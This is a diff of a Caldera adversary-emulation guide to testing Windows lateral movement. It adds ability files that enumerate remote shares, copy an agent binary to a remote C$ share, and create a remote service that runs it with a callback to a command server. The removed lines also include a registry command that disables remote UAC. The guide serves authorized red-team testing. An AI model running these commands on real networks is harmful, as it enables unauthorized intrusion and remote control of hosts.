@@ -1,9 +1,8 @@
-Windows Lateral Movement Guide
-======================
+# Windows Lateral Movement Guide
 
-Using CALDERA's lateral movement and execution abilities, you can perform and test an adversary's capability to move 
-laterally within your network. This guide will walk you through some of the necessary setup steps to get started with 
-testing lateral movement in a Windows environment.  
+Exercising Caldera's lateral movement and remote execution abilities allows you to test how easily an adversary can move
+within your network. This guide will walk you through some of the necessary setup steps to get started with testing 
+lateral movement in a Windows environment.  
 
 ## Setup
 
@@ -19,22 +18,9 @@ netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=
 ### User with Administrative Privileges
 
 This guide will assume a user *with administrative privileges to the target host* has been compromised and that a CALDERA
-agent has been spawned with this user's privileges. Scenarios where (1) the user has administrative privileges but is 
-not a domain account and (2) the user has administrative privileges and is a domain account are addressed in the 
-following sub sections.
-
-#### Non-Domain Account
-If the user with administrative privileges is *not* a domain account, remote UAC must be disabled on the target host by
-updating the following value in the registry. The command below will overwrite the existing registry value or add the
-vlaue if it doesn't already exist.
-```
-reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
-```
-After executing the above command, restart the host to apply the changes.
-
-
-#### Domain Account
-No additional setup should be necessary. 
+agent has been spawned with this user's privileges. Some methods of lateral movement may depend on whether (1) the user 
+has administrative privileges but is not a domain account or (2) the user has administrative privileges and is a domain 
+account. The example walkthrough in this guide should not be impacted by these distinctions.
 
 ### Additional Considerations
 
@@ -70,23 +56,129 @@ remotely.
 
 ### Execution of the Binary
 CALDERA's Stockpile execution abilities relevant to lateral movement mainly use wmic to remotely start the binary. Some 
-additional execution methods include modifications to Windows services, scheduled tasks, and Registry Run keys or start 
-up folder to execute the binary.
+additional execution methods include modifications to Windows services and scheduled tasks. The example in this guide 
+will use the creation of a service to remotely start the binary (ability file included at the end of this guide).
+
+See ATT&CK's [Execution](https://attack.mitre.org/tactics/TA0002/) tactic page for more details on execution methods. 
+
+### Displaying Lateral Movement in Debrief
+Using the adversary profile in this guide and CALDERA's Debrief plugin, you can view the path an adversary took through 
+the network via lateral movement attempts. In the Debrief modal, select the operation where lateral movement was 
+attempted then select the Attack Path view from the upper right hand corner of graph views. This graph displays the 
+originating C2 server and agent nodes connected by the execution command linking the originating agent to the newly
+spawned agent.
+
+In the example attack path graph below, the Service Creation Lateral Movement adversary profile was run on the `win10` 
+host, which moved laterally to the `VAGRANTDC` machine via successful execution of the Service Creation ability.
+
+![Debrief Attack Path Example](/img/debrief_attack_path.png)    
+
+This capability relies on the `origin_link_id` field to be populated within the agent profile upon first
+check-in and is currently implemented for the default agent, 54ndc47. For more information about the `#{origin_link_id}`
+global variable, see the explanation of **Command** in the [What is an Ability?](/docs/Learning-the-Terminology.html#what-is-an-ability)
+section of the Learning the Terminology guide. For more information about how lateral movement tracking is implemented 
+in agents to be used with CALDERA, see the [Lateral Movement Tracking](/docs/How-to-Build-Agents.html#lateral-movement-tracking) 
+section of the How to Build Agents guide.
+
 
 ## Example Lateral Movement Profile
 This section will walkthrough the necessary steps for proper execution of the Service Creation Lateral Movement
 adversary profile. This section will assume successful setup from the previous sections mentioned in this guide and that
-a 54ndc47 agent has been spawned with administrative privileges to the remote target host.
+a 54ndc47 agent has been spawned with administrative privileges to the remote target host. The full ability files used 
+in this adversary profile are included at the end of this guide.
+
 1. Go to `navigate` pane > `Advanced` > `sources`. This should open a new sources modal in the web GUI.
 2. Click the toggle to create a new source. Enter "SC Source" as the source name. Then enter `remote.host.fqdn` as the 
 fact trait and the FQDN of the target host you are looking to move laterally to as the fact value. Click `Save` once 
-source configuration ahs been completed.
+source configuration has been completed.
 3. Go to `navigate` pane > `Campaigns` > `operations`. Click the toggle to create a new operation. Under 
 `BASIC OPTIONS` select the group with the relevant agent and the Service Creation Lateral Movement profile. Under 
 `AUTONOMOUS`, select `Use SC Source facts`. If the source created from the previous step is not available in the 
 drop down, try refreshing the page. 
-4. Once operation configurations have been completed, click `Start` to start the operation. **NOTE: this adversary
-profile uses an ability that creates and starts a Windows service. Because the 54ndc47 executable will *not* respond
-as an expected service executable would, it is assumed to have timed out/did not respond in a timely manner. CALDERA
-will also therefore assume this ability has failed or timed out.**
-5. Check the agents list for a new agent on the target host.  
+4. Once operation configurations have been completed, click `Start` to start the operation.
+5. Check the agents list for a new agent on the target host.
+
+### Ability Files Used 
+```
+- id: deeac480-5c2a-42b5-90bb-41675ee53c7e
+  name: View remote shares
+  description: View the shares of a remote host
+  tactic: discovery
+  technique:
+    attack_id: T1135
+    name: Network Share Discovery
+  platforms:
+    windows:
+      psh:
+        command: net view \\#{remote.host.fqdn} /all
+        parsers:
+          plugins.stockpile.app.parsers.net_view:
+          - source: remote.host.fqdn
+            edge: has_share
+            target: remote.host.share
+      cmd:
+        command: net view \\#{remote.host.fqdn} /all
+        parsers:
+          plugins.stockpile.app.parsers.net_view:
+          - source: remote.host.fqdn
+            edge: has_share
+            target: remote.host.share
+```
+
+```
+- id: 65048ec1-f7ca-49d3-9410-10813e472b30
+  name: Copy 54ndc47 (SMB)
+  description: Copy 54ndc47 to remote host (SMB)
+  tactic: lateral-movement
+  technique:
+    attack_id: T1021.002
+    name: "Remote Services: SMB/Windows Admin Shares"
+  platforms:
+    windows:
+      psh:
+        command: |
+          $path = "sandcat.go-windows";
+          $drive = "\\#{remote.host.fqdn}\C$";
+          Copy-Item -v -Path $path -Destination $drive"\Users\Public\s4ndc4t.exe";
+        cleanup: |
+          $drive = "\\#{remote.host.fqdn}\C$";
+          Remove-Item -Path $drive"\Users\Public\s4ndc4t.exe" -Force;
+        parsers:
+          plugins.stockpile.app.parsers.54ndc47_remote_copy:
+          - source: remote.host.fqdn
+            edge: has_54ndc47_copy
+        payloads:
+        - sandcat.go-windows
+  requirements:
+  - plugins.stockpile.app.requirements.not_exists:
+    - source: remote.host.fqdn
+      edge: has_54ndc47_copy
+  - plugins.stockpile.app.requirements.basic:
+    - source: remote.host.fqdn
+      edge: has_share
+  - plugins.stockpile.app.requirements.no_backwards_movement:
+    - source: remote.host.fqdn
+```
+
+```
+- id: 95727b87-175c-4a69-8c7a-a5d82746a753
+  name: Service Creation
+  description: Create a service named "sandsvc" to execute remote 54ndc57 binary named "s4ndc4t.exe"
+  tactic: execution
+  technique:
+    attack_id: T1569.002
+    name: 'System Services: Service Execution'
+  platforms:
+    windows:
+      psh:
+        timeout: 300
+        cleanup: |
+          sc.exe \\#{remote.host.fqdn} stop sandsvc;
+          sc.exe \\#{remote.host.fqdn} delete sandsvc /f;
+          taskkill /s \\#{remote.host.fqdn} /FI "Imagename eq s4ndc4t.exe"
+        command: |
+          sc.exe \\#{remote.host.fqdn} create sandsvc start= demand error= ignore binpath= "cmd /c start C:\Users\Public\s4ndc4t.exe -server #{server} -v -originLinkID #{origin_link_id}" displayname= "Sandcat Execution";
+          sc.exe \\#{remote.host.fqdn} start sandsvc;
+          Start-Sleep -s 15;
+          Get-Process -ComputerName #{remote.host.fqdn} s4ndc4t;
+```  
